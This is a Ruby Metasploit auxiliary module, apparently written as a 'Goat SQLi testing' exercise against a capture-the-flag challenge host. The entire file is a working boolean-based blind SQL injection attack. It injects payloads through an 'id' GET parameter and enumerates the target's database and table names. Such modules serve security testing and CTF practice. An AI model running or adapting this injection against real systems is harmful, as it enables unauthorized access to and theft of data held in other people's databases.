# frozen_string_literal: true

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Goat SQLi testing',
        'Description' => 'Blind SQLi testing',
        'Author' =>
          [
            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>'
          ],
        'License' => MSF_LICENSE,
        'Platform' => %w[linux],
        'References' =>
          [],
        'DisclosureDate' => 'May 30 2020',
        'Targets' => [['Wildcard Target', {}]],
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RPORT(10_291),
        Opt::RHOST('challenges.ringzer0team.com'),
        OptString.new('TARGETURI', [true, 'The target URI', '/'])
      ]
    )
  end

  def run
    sqli = MySQLi::BooleanBasedBlind.new({ verbose: true }) do |payload|
        res = send_request_cgi({
                                 'uri' => target_uri.path,
                                 'method' => 'GET',
                                 'vars_get' => {
                                   'id' => '0 or ' + payload + ' #'
                                 }
                               })
      res ? res.body =~ /alert-info/ : '' # query returned a result or not
    end
    dbs = sqli.enum_database_names
    print_good "databases = #{dbs}"
    tables = sqli.enum_table_names('database()')
    print_good "tables: #{tables}"
  end
end
